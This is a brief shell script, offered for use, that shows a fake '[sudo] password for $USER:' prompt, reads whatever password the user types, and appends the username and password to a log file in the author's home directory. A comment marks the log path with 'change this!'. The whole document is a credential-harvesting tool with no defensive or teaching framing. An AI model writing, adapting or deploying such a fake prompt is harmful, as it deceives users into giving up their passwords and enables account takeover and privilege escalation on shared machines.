#this is a simple script to trick a user to enter their password.

#tell the user to enter their sudu password
echo "[sudo] password for $USER: "

#lets the user to enter password
read password

#logs username and password to a file
echo "$USER - sudu password: $password" >> /home/<YOURUSERNAME>/log   #change this!

exit
